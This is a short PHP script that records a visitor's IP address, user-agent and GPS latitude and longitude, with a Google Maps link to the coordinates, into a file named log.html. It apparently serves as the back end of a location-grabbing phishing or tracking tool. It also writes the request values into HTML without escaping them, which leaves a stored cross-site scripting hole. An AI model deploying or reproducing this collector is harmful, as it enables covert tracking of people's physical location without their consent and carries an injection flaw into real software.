<?php
if (isset($_GET['lat']) && isset($_GET['long']) && isset($_GET['agent'])) {
    $file = fopen("log.html", "a");

    // Get the current date and time
    $date = date("d-m-Y H:i:s");

    // Get the IP address of the client
    $ip = $_SERVER["REMOTE_ADDR"];

    // Get the latitude and longitude from the GET request
    $lat = $_GET["lat"];
    $long = $_GET["long"];

    // Generate the Google Maps URL with the latitude and longitude
    $url = "https://www.google.com/maps/search/?api=1&query=" . $lat . "," . $long;

    // Get the user-agent from the GET request
    $agent = $_GET["agent"];

    // Create the data string to be written to the log file
    $data = "<pre>Datetime: " . $date . "\nIP: " . $ip . "\nLocation: " . "<a href='" . $url . "' target='_blank'>Click Here</a>" . "\nUser-Agent: " . $agent . "</pre>\n";

    // Write the data to the log file
    fwrite($file, $data);

    // Close the log file
    fclose($file);
}
?>
